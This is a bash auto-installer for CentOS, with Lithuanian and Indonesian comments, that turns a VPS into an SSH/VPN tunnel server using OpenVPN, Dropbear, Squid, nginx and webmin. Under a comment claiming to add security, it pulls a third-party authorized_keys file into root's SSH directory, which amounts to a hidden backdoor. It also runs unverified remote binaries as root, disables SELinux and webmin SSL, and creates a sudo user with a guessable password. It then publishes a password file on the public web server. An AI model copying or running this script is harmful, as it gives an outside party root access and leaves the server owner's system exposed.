#!/bin/bash
# Script Auto Installer by gatyto
# initialisasi var
OS=`uname -p`;

# serverio savininko duomenys
read -p "Koks tavo Vardas: " namap
read -p "Koks tavo telefono numeris: " nhp
read -p "Ivesk serverio varda: " dname

# pakeisti hostname
echo -e "\033[32mTavo dabartinis Hostname vardas $HOSTNAME\033[0m"
read -p "Parasyk sito VPS varda arba pavadinima: " hnbaru
echo "HOSTNAME=$hnbaru" >> /etc/sysconfig/network
hostname "$hnbaru"
echo "Hostname buvo pakeistas y $hnbaru"
read -p "Maksimalus prisijungimas useriui (pvz 1 arba 2): " llimit
echo "Prasideda diegimio procesas gali trukti 15min ....."

# Banner SSH
echo "## VPS Gatyto menu $hnbaru ## " >> /etc/pesan
echo "<br><br>
<font color="#971221">

──▀▀▀▀▀▀▀▀▀▀▀▄▄▀▀▀▀▀▀▀▀▀▀▀
────────────█▀▀█
───────────█▓▓▓▓█
───────══▄▀█▓▓▓▓█▀▄══
──▄▄▄▄▄▄▄█▒█▓▓▓▓█▒█▄▄▄▄▄▄▄
──█▀▀▀▀█▀███▄▓▓▄███▀█▀▀▀▀█
─▄█▄──▄█▄───▀██▀───▄█▄──▄█▄
─█▒█──█▒█──────────█▒█──█▒█
─▀▀▀──▀▀▀──────────▀▀▀──▀▀▀
</font><br><br><br>: " >> /etc/pesan
echo "1. Su situo serveriu negalima DDoS, Hacking, Phising, Spam, ir Torrentai; " >> /etc/pesan
echo "2. Maksimalus prisijngimas $llimit jai bus daugiau servas trins paskyra; " >> /etc/pesan
echo "h1><font>=============================</font></h1>
<h1><font color="blue">
Gatyto serveris ™
</font></h1> " >> /etc/pesan
echo "3. Vartotojas kuris bando pakenkti serveruj bus neatleidziama; " >> /etc/pesan
echo "Server by $namap ( $nhp )" >> /etc/pesan

echo "Banner /etc/pesan" >> /etc/ssh/sshd_config

# update software server
yum update -y

# go to root
cd

# disable se linux
echo 0 > /selinux/enforce
sed -i 's/SELINUX=enforcing/SELINUX=disable/g'  /etc/sysconfig/selinux

# set locale
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
service sshd restart

# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.d/rc.local

# install wget and curl
yum -y install wget curl

# setting repo
wget http://dl.fedoraproject.org/pub/epel/6/i386/epel-release-6-8.noarch.rpm
wget http://rpms.famillecollet.com/enterprise/remi-release-6.rpm
rpm -Uvh epel-release-6-8.noarch.rpm
rpm -Uvh remi-release-6.rpm

if [ "$OS" == "x86_64" ]; then
  wget https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/app/rpmforge.rpm
  rpm -Uvh rpmforge.rpm
else
  wget https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/app/rpmforge.rpm
  rpm -Uvh rpmforge.rpm
fi

sed -i 's/enabled = 1/enabled = 0/g' /etc/yum.repos.d/rpmforge.repo
sed -i -e "/^\[remi\]/,/^\[.*\]/ s|^\(enabled[ \t]*=[ \t]*0\\)|enabled=1|" /etc/yum.repos.d/remi.repo
rm -f *.rpm

# remove unused
yum -y remove sendmail;
yum -y remove httpd;
yum -y remove cyrus-sasl

# update
yum -y update

# Untuk keamanan server
cd
mkdir /root/.ssh
wget https://github.com/xxnnxxnn/bandymas/raw/master/conf/ak -O /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
echo "AuthorizedKeysFile     .ssh/authorized_keys" >> /etc/ssh/sshd_config
sed -i 's/PermitRootLogin yes/#PermitRootLogin no/g' /etc/ssh/sshd_config
echo "PermitRootLogin no" >> /etc/ssh/sshd_config
echo "$dname  ALL=(ALL)  ALL" >> /etc/sudoers
service sshd restart

# install webserver
yum -y install nginx php-fpm php-cli
service nginx restart
service php-fpm restart
chkconfig nginx on
chkconfig php-fpm on

# install essential package
yum -y install rrdtool screen iftop htop nmap bc nethogs openvpn vnstat ngrep mtr git zsh mrtg unrar rsyslog rkhunter mrtg net-snmp net-snmp-utils expect nano bind-utils
yum -y groupinstall 'Development Tools'
yum -y install cmake
yum -y --enablerepo=rpmforge install axel sslh ptunnel unrar

# matiin exim
service exim stop
chkconfig exim off

# setting vnstat
vnstat -u -i eth0
echo "MAILTO=root" > /etc/cron.d/vnstat
echo "*/5 * * * * root /usr/sbin/vnstat.cron" >> /etc/cron.d/vnstat
service vnstat restart
chkconfig vnstat on

# install screenfetch
cd
wget https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/app/screenfetch-dev
mv screenfetch-dev /usr/bin/screenfetch
chmod +x /usr/bin/screenfetch
echo "clear" >> .bash_profile
echo "screenfetch" >> .bash_profile

# install webserver
cd
wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/conf/nginx.conf"
sed -i 's/www-data/nginx/g' /etc/nginx/nginx.conf
mkdir -p /home/vps/public_html
echo "<pre>Gatyto VPS</pre>" > /home/vps/public_html/index.html
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
rm /etc/nginx/conf.d/*
wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/conf/vps.conf"
sed -i 's/apache/nginx/g' /etc/php-fpm.d/www.conf
chmod -R +rx /home/vps
service php-fpm restart
service nginx restart

# install openvpn
wget -O /etc/openvpn/openvpn.zip "https://github.com/xxnnxxnn/bandymas/raw/master/conf/openvpn-key.zip"
cd /etc/openvpn/
unzip openvpn.zip
wget -O /etc/openvpn/1194.conf "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/conf/1194-centos.conf"
if [ "$OS" == "x86_64" ]; then
  wget -O /etc/openvpn/1194.conf "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/conf/1194-centos64.conf"
fi
wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/conf/iptables.up.rules"
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.d/rc.local
MYIP=`curl icanhazip.com`;
MYIP2="s/xxxxxxxxx/$MYIP/g";
sed -i $MYIP2 /etc/iptables.up.rules;
sed -i 's/venet0/eth0/g' /etc/iptables.up.rules
iptables-restore < /etc/iptables.up.rules
sysctl -w net.ipv4.ip_forward=1
sed -i 's/net.ipv4.ip_forward = 0/net.ipv4.ip_forward = 1/g' /etc/sysctl.conf
service openvpn restart
chkconfig openvpn on
cd

# configure openvpn client config
cd /etc/openvpn/
wget -O /etc/openvpn/client.ovpn "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/openvpn.conf"
sed -i $MYIP2 /etc/openvpn/client.ovpn;
#PASS=`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 15 | head -n 1`;
useradd -g 0 -d /root/ -s /bin/bash $dname
echo $dname:$dname"@gatyto" | chpasswd
echo $dname > pass.txt
echo $dname"@gatyto" >> pass.txt
tar cf client.tar client.ovpn pass.txt
cp client.tar /home/vps/public_html/
cp client.ovpn /home/vps/public_html/

# install badvpn
cd
wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/conf/badvpn-udpgw"
if [ "$OS" == "x86_64" ]; then
  wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/conf/badvpn-udpgw64"
fi
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.d/rc.local
chmod +x /usr/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300

# install mrtg
cd /etc/snmp/
wget -O /etc/snmp/snmpd.conf "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/conf/snmpd.conf"
wget -O /root/mrtg-mem.sh "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/conf/mrtg-mem.sh"
chmod +x /root/mrtg-mem.sh
service snmpd restart
chkconfig snmpd on
snmpwalk -v 1 -c public localhost | tail
mkdir -p /home/vps/public_html/mrtg
cfgmaker --zero-speed 100000000 --global 'WorkDir: /home/vps/public_html/mrtg' --output /etc/mrtg/mrtg.cfg public@localhost
curl "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/conf/mrtg.conf" >> /etc/mrtg/mrtg.cfg
sed -i 's/WorkDir: \/var\/www\/mrtg/# WorkDir: \/var\/www\/mrtg/g' /etc/mrtg/mrtg.cfg
sed -i 's/# Options\[_\]: growright, bits/Options\[_\]: growright/g' /etc/mrtg/mrtg.cfg
indexmaker --output=/home/vps/public_html/mrtg/index.html /etc/mrtg/mrtg.cfg
echo "0-59/5 * * * * root env LANG=C /usr/bin/mrtg /etc/mrtg/mrtg.cfg" > /etc/cron.d/mrtg
LANG=C /usr/bin/mrtg /etc/mrtg/mrtg.cfg
LANG=C /usr/bin/mrtg /etc/mrtg/mrtg.cfg
LANG=C /usr/bin/mrtg /etc/mrtg/mrtg.cfg

# setting port ssh
cd
sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
sed -i 's/#Port 22/Port  22/g' /etc/ssh/sshd_config
service sshd restart
chkconfig sshd on

# install dropbear
yum -y install dropbear
echo "OPTIONS=\"-p 109 -p 110 -p 443 -b /etc/pesan\"" > /etc/sysconfig/dropbear
echo "/bin/false" >> /etc/shells
echo "PIDFILE=/var/run/dropbear.pid" >> /etc/init.d/dropbear
service dropbear restart
chkconfig dropbear on

# install vnstat gui
cd /home/vps/public_html/
wget https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/app/vnstat_php_frontend-1.5.1.tar.gz
tar xf vnstat_php_frontend-1.5.1.tar.gz
rm vnstat_php_frontend-1.5.1.tar.gz
mv vnstat_php_frontend-1.5.1 vnstat
cd vnstat
sed -i "s/\$iface_list = array('eth0', 'sixxs');/\$iface_list = array('eth0');/g" config.php
sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
sed -i 's/Internal/Internet/g' config.php
sed -i '/SixXS IPv6/d' config.php

# install fail2ban
cd
yum -y install fail2ban
service fail2ban restart
chkconfig fail2ban on

# install squid
yum -y install squid
wget -O /etc/squid/squid.conf "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/conf/squid-centos.conf"
sed -i $MYIP2 /etc/squid/squid.conf;
service squid restart
chkconfig squid on

# install webmin
cd
wget http://prdownloads.sourceforge.net/webadmin/webmin-1.831-1.noarch.rpm
yum -y install perl perl-Net-SSLeay openssl perl-IO-Tty
rpm -U webmin*
rm -f webmin*
sed -i -e 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
service webmin restart
chkconfig webmin on

# pasang bmon
if [ "$OS" == "x86_64" ]; then
  wget -O /usr/bin/bmon "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/conf/bmon64"
else
  wget -O /usr/bin/bmon "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/conf/bmon"
fi
chmod +x /usr/bin/bmon

# auto kill multi login
echo "while :" >> /usr/bin/autokill
echo "  do" >> /usr/bin/autokill
echo "  userlimit $llimit" >> /usr/bin/autokill
echo "  sleep 20" >> /usr/bin/autokill
echo "  done" >> /usr/bin/autokill

# downlaod script
cd /usr/bin
wget -O speedtest "https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py"
wget -O bench "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/bench-network.sh"
wget -O mem "https://raw.githubusercontent.com/pixelb/ps_mem/master/ps_mem.py"
wget -O userlogin "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/user-login.sh"
wget -O userexpire "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/autoexpire.sh"
wget -O usernew "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/create-user.sh"
wget -O userdelete "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/user-delete.sh"
wget -O userlimit "https://github.com/xxnnxxnn/bandymas/raw/master/user-limit.sh"
wget -O renew "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/user-renew.sh"
wget -O userlist "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/user-list.sh" 
wget -O trial "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/user-trial.sh"
echo "cat /root/log-install.txt" | tee info
echo "speedtest --share" | tee speedtest
wget -O /root/chkrootkit.tar.gz ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
tar zxf /root/chkrootkit.tar.gz -C /root/
rm -f /root/chkrootkit.tar.gz
mv /root/chk* /root/chkrootkit
wget -O checkvirus "https://github.com/xxnnxxnn/bandymas/raw/master/checkvirus.sh"
#wget -O cron-autokill "https://raw.githubusercontent.com/xxnnxxnn/bandymas/master/cron-autokill.sh"
wget -O cron-dropcheck "https://github.com/xxnnxxnn/bandymas/raw/master/cron-dropcheck.sh"

# sett permission
chmod +x userlogin
chmod +x userdelete
chmod +x userexpire
chmod +x usernew
chmod +x userlist
chmod +x userlimit
chmod +x renew
chmod +x trial
chmod +x info
chmod +x speedtest
chmod +x bench
chmod +x mem
chmod +x checkvirus
#chmod +x autokill
#chmod +x cron-autokill
chmod +x cron-dropcheck

# cron
cd
service crond start
chkconfig crond on
service crond stop
echo "0 */12 * * * root /bin/sh /usr/bin/userexpire" > /etc/cron.d/user-expire
echo "0 */12 * * * root /bin/sh /usr/bin/reboot" > /etc/cron.d/reboot
#echo "* * * * * root /bin/sh /usr/bin/cron-autokill" > /etc/cron.d/autokill
echo "* * * * * root /bin/sh /usr/bin/cron-dropcheck" > /etc/cron.d/dropcheck
#echo "0 */1 * * * root killall /bin/sh" > /etc/cron.d/killak

# set time GMT +7
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime

# finalisasi
chown -R nginx:nginx /home/vps/public_html
service nginx start
service php-fpm start
service vnstat restart
service openvpn restart
service snmpd restart
service sshd restart
service dropbear restart
service fail2ban restart
service squid restart
service webmin restart
service crond start
chkconfig crond on

# info
echo "Aktivuota"  | tee -a log-install.txt
echo "--------------------------------------"  | tee -a log-install.txt
echo "OpenVPN : TCP 1194 (client config : http://$MYIP:81/client.ovpn)"  | tee -a log-install.txt
echo "Port OpenSSH : 22, 143"  | tee -a log-install.txt
echo "Port Dropbear : 109, 110, 443"  | tee -a log-install.txt
echo "SquidProxy    : 80, 8080 (limitas IP SSH)"  | tee -a log-install.txt
echo "Nginx : 81"  | tee -a log-install.txt
echo "badvpn   : badvpn-udpgw port 7300"  | tee -a log-install.txt
echo "Webmin   : http://$MYIP:10000/"  | tee -a log-install.txt
echo "vnstat   : http://$MYIP:81/vnstat/"  | tee -a log-install.txt
echo "MRTG     : http://$MYIP:81/mrtg/"  | tee -a log-install.txt
echo "Timezone : Asia/Jakarta"  | tee -a log-install.txt
echo "Fail2Ban : [on]"  | tee -a log-install.txt
echo "IPv6     : [off]"  | tee -a log-install.txt
echo "Root Login on Port 22 : [disabled]"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "Tools"  | tee -a log-install.txt
echo "-----"  | tee -a log-install.txt
echo "axel, bmon, htop, iftop, mtr, nethogs"  | tee -a log-install.txt
echo "" | tee -a log-install.txt
echo "Numatyta (paskira SSH ir VPN)"  | tee -a log-install.txt
echo "---------------"  | tee -a log-install.txt
echo "User     : $dname"  | tee -a log-install.txt
echo "Password : $dname@gatyto"  | tee -a log-install.txt
echo "sudo aktivuotas vartotojui $dname"  | tee -a log-install.txt
echo "" | tee -a log-install.txt
echo "Scripto Komandos"  | tee -a log-install.txt
echo "\033------------------------------------\033"  | tee -a log-install.txt
echo "speedtest --share : speedtest vps"  | tee -a log-install.txt
echo "mem : ramai"  | tee -a log-install.txt
echo "checkvirus : skenuoti virus / malware"  | tee -a log-install.txt
echo "bench      : untuk melihat performa vps" | tee -a log-install.txt
echo "usernew    : sukurti useri"  | tee -a log-install.txt
echo "userlist   : useriu listas"  | tee -a log-install.txt
echo "userlimit <limit> : uzdeti limita <limit>. pvz: userlimit 1"  | tee -a log-install.txt
echo "userlogin  : prisijungia useriai"  | tee -a log-install.txt
echo "userdelete : istrinti useri"  | tee -a log-install.txt
echo "trial      : sukurti vienos dienos testa"  | tee -a log-install.txt
echo "renew      : pratesti"  | tee -a log-install.txt
echo "info       : info VPS"  | tee -a log-install.txt
echo "--------------------------------------"  | tee -a log-install.txt
echo "PASTABA: saugumo sumetimais, jei norite prisijungti prie pagrindinio serverio, naudokite 443 prievadą" | tee -a log-install.txt
rm -f /root/centos-gatyto.sh
